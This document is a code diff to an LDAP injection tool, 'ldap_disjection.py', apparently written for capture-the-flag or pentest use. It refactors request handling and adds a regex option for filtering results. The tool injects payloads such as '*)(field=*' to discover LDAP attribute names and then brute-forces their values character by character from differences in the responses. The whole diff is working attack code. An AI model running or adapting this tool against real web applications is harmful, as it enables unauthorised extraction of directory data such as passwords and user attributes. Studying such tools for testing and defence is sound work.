@@ -2,6 +2,7 @@
 # ldap_disjection.py
 import logging
 import requests
+import re
 from sys import exit
 from os.path import isfile
 import string
@@ -9,6 +10,8 @@ from time import sleep
 from urllib3 import disable_warnings
 from urllib3.exceptions import InsecureRequestWarning
 from urllib.parse import quote
+from ve_utils.utype import UType as Ut
+from ve_utils.ujson import UJson as Ujs
 import argparse
 
 __version__ = "1.0.0"
@@ -35,6 +38,7 @@ class WebLdapScanner:
             'cond': kwargs.get('cond'),
             'neg_cond': kwargs.get('neg_cond'),
             'word_list': kwargs.get('word_list'),
+            'res_reg': self.init_regex(kwargs.get('res_reg')),
             'sleep_req': 0.2,
             'req_per_second': 5.0,
             'debug': False,
@@ -56,6 +60,14 @@ class WebLdapScanner:
                 logger.info(f"[*] Invalid sleep_req value, by default is set to 0.2 s.")
                 pass
 
+    def init_regex(self, reg: str, default=None):
+        result = default
+        if Ut.is_str(reg):
+            try:
+                result = re.compile(reg)
+            except Exception as ex:
+                pass
+        return result
 
     def read_word_list(self, word_list: str):
         if isfile(word_list):
@@ -77,17 +89,60 @@ class WebLdapScanner:
             for field in fields:
                 yield str(field)
 
-    def discover_fields(self, **kwargs):
-        (url,
-         prm_start,
-         value_start,
-         cond,
-         neg_cond,
-         word_list,
-         req_type,
-         sleep_req,
-         debug) = WebLdapScanner.get_discover_prms(**kwargs).values()
+    def send_request(self, url:str, res_type:str="text", data=None):
+        """"""
+        if Ut.is_str(url):
+            try:
+                if Ut.is_dict(data) or Ut.is_list(data):
+                    rsp = requests.post(url, data=data)
+                else:
+                    rsp = requests.get(url)
+                
+                if rsp is not None and rsp.status_code in [200, 201]:
+                    if res_type == "json":
+                        return Ujs.loads_json(rsp.text, False), rsp.status_code
+                    else:
+                        return rsp.text, rsp.status_code
 
+            except requests.exceptions.ConnectionError as ex:
+                logger.error(f"[*] Request send to server but throw an error: {ex}")
+                exit(1)
+    
+    def scan_response(self,
+                      response:str,
+                      status_code:int,
+                      cond:str,
+                      neg_cond:str,
+                      res_reg:str):
+        """"""
+        is_cond, is_neg_cond, is_valid_field, result = False, False, False, None
+        if Ut.is_str(response):
+            try:
+                is_cond = cond is not None and cond in response
+                is_neg_cond = neg_cond is not None and neg_cond not in response
+
+                is_valid_field = (cond is None or is_cond is True) \
+                    and (neg_cond is None or is_neg_cond is True)
+
+                if isinstance(res_reg, re.Pattern):
+                    result = re.findall(res_reg, response)
+                else:
+                    result = response
+            except Exception as ex:
+                logger.error(f"[*] Response analyse throw an error: {ex}")
+        return is_cond, is_neg_cond, is_valid_field, result
+
+    def discover_fields(self, 
+                        url: str, 
+                        prm_start: str, 
+                        value_start: str, 
+                        cond: str, 
+                        neg_cond: str, 
+                        word_list: str, 
+                        req_type: str, 
+                        sleep_req: float,
+                        *args,
+                        **kwargs):
         fields = []
         logger.warning(f"[*] Start Discover valid LDAP fields.")
         payload = ""
@@ -98,22 +153,24 @@ class WebLdapScanner:
             if field != prm_start:
                 if req_type == "GET":
                     payload = f"{url_base}*)({field}=*"
-                    r = requests.get(payload)
+                    text, status_code = self.send_request(payload)
                 else:
                     payload = {prm_start:'*)('+field+'=*'}
-                    r = requests.post(url, data = payload)
+                    text, status_code = self.send_request(url, data=payload)
 
-                is_cond = cond is not None and cond in r.text
-                is_neg_cond = neg_cond is not None and neg_cond not in r.text
-
-                is_valid_field = (cond is None or is_cond is True) \
-                    and (neg_cond is None or is_neg_cond is True)
-
+                is_cond, is_neg_cond, is_valid_field, text = self.scan_response(
+                    response=text,
+                    status_code=status_code,
+                    cond=cond,
+                    neg_cond=neg_cond,
+                    res_reg=self.prms.get('res_reg')
+                )
+                
                 WebLdapScanner.print_discover_line(
                         payload=payload,
                         field=field,
-                        status_code=r.status_code,
-                        text=r.text,
+                        status_code=status_code,
+                        text=text,
                         is_cond=is_cond,
                         is_neg_cond=is_neg_cond,
                         is_valid_field=is_valid_field
@@ -125,16 +182,18 @@ class WebLdapScanner:
                 sleep(sleep_req)
         return fields
 
-    def brute_field_value(self, **kwargs):
-        (url,
-         prm_start,
-         value_start,
-         brute_prm,
-         cond,
-         neg_cond,
-         req_type,
-         sleep_req,
-         req_per_second) = WebLdapScanner.get_brute_prms(**kwargs).values()
+    def brute_field_value(self, 
+                        url: str,
+                        prm_start: str,
+                        value_start: str,
+                        brute_prm:str,
+                        cond: str,
+                        neg_cond: str,
+                        req_type: str,
+                        sleep_req: float,
+                        req_per_second:float,
+                        *args,
+                        **kwargs):
         
         alphabet = string.ascii_letters + string.digits +  "_@{}-/()!\"$%=^[]:; "
         url_base = WebLdapScanner.get_base_url(url, prm_start, value_start)
@@ -159,19 +218,21 @@ class WebLdapScanner:
                 else:
                     quoted = char #WebLdapScanner.get_quoted(char)
                 payload = f"{url_base}*)({brute_prm}={flag}{quoted}*"
-                r = requests.post(payload)
+                text, status_code = self.send_request(payload)
                 #r = FakeRequest()
-                is_cond = cond is not None and cond in r.text
-                is_neg_cond = neg_cond is not None and neg_cond not in r.text
-
-                is_valid_field = (cond is None or is_cond is True) \
-                    and (neg_cond is None or is_neg_cond is True)
+                is_cond, is_neg_cond, is_valid_field, text = self.scan_response(
+                    response=text,
+                    status_code=status_code,
+                    cond=cond,
+                    neg_cond=neg_cond,
+                    res_reg=self.prms.get('res_reg')
+                )
 
                 WebLdapScanner.print_brute_field_value(
                     payload=payload,
                     flag=flag,
-                    status_code=r.status_code,
-                    text=r.text,
+                    status_code=status_code,
+                    text=text,
                     is_cond=is_cond,
                     is_neg_cond=is_neg_cond,
                     is_valid_field=is_valid_field
@@ -200,9 +261,13 @@ class WebLdapScanner:
     def run(self):
         result = None
         if self.prms.get('mode') == "discover":
-            result = self.discover_fields(**self.prms)
+            result = self.discover_fields(
+                *WebLdapScanner.get_discover_prms(**self.prms).values()
+            )
         elif self.prms.get('mode') == "brutforce":
-            result = self.brute_field_value(**self.prms)
+            result = self.brute_field_value(
+                *WebLdapScanner.get_brute_prms(**self.prms).values()
+            )
         return result
 
     @staticmethod
@@ -310,7 +375,7 @@ class WebLdapScanner:
         else:
             logger.debug(f"[*] --------------------")
             logger.debug(f"[*] Payload : {payload}")
-            logger.debug(f"Field: {field}")
+            logger.info(f"Flag: {flag}")
             logger.debug(f"Content Length: {len(text)}")
         logger.debug(f"[*] Request status code : {status_code}")
         logger.debug(f"[*] Is cond active and in Response text : {is_cond}")
@@ -434,6 +499,8 @@ def parse_args():
     parser.add_argument("-P", "--post", 
                         help="Specify POST request type", 
                         action="store_true" )
+    parser.add_argument("-r", "--res_reg", 
+                        help="Specify the regex to apply to result" )
     parser.add_argument("-ll", "--log_level", 
                         help="Specify the log verbosity level", 
                         choices=range(1, 5),
